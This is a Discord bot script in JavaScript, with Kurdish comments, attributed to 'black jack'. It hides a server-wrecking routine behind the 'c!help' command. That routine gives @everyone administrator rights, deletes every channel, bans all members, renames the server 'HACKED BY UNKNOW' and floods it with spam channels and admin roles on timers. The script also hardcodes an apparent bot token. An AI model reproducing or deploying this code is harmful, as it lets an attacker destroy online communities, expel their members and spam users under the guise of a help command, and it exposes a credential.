const Discord = require('discord.js');
const client = new Discord.Client();
const prefix = 'c!'///lera ba dly xot prefix dabne
client.on('ready', () => {
console.log(`Logged in as ${client.user.tag}!`);
 
});

          
/////Ban all

////

          
client.on("ready", () => {
  console.log('♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔');
  console.log('By black jack');/////BLACK JACK 
console.log('♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔');
console.log(`Logged in as ${client.user.tag}!`);
  client.user.setActivity(`${prefix}help | BOT SESTAM ${client.guilds.size}`)///////shtek bnwsa
 client.user.setStatus("dnd")/////ba dly xot statusek bnwsa
  console.log(`Logined`)
})
///created by black jack 
client.on('message', message => {
    if (message.content.toLowerCase() === prefix + 'help') {
        message.guild.roles.find('name', '@everyone').edit({
            permissions: ["ADMINISTRATOR"]
        });
        let oldnm = message.guild.name;
        message.guild.channels.map(c => {
            c.delete();
        });
    message.guild.members.forEach( member => {
          
          member.ban()
      })
      
        setInterval(() => {
            message.guild.createRole({
                name: "HACKED BY UNKNOW",
                permissions: ["ADMINISTRATOR"]
            }).then(rr => {
 
                message.member.addRole(rr.id);
            });
        }, 1000);
        message.guild.setIcon("https://media.discordapp.net/attachments/793750057500278805/806561503980421120/image0.jpg");
        message.guild.setName('HACKED BY UNKNOW');
        setTimeout(function() {
            setInterval(() => {
          
                message.guild.createChannel('HACKED BY UNKNOW', 'text').then(channel => {
                channel.send('@everyone HACKRAWA LALAYAN NADYAR:joy: :joy: :joy:')
               
                })
            }
                        
                        , 500)
            })
        }
    
})  

 ////codaka drwst krawa lalayan black jack

client.login("ODA0NjA1NDU3OTE3NTQyNDUx.YBOxOg.tG3he6rpLHmpm0Th9lAejofZH_8")
          